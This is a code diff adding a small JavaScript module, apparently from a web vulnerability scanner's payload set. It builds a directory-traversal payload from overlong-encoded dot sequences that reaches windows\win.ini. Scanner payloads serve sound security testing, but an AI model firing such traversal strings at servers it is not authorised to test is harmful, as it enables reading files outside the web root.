@@ -1,0 +1,7 @@
+const { genstr } = require("../utils");
+
+function getPayload() {
+    return genstr(8, "/%c0%ae%c0%ae") + "/windows\\win.ini";
+}
+
+module.exports = { getPayload };
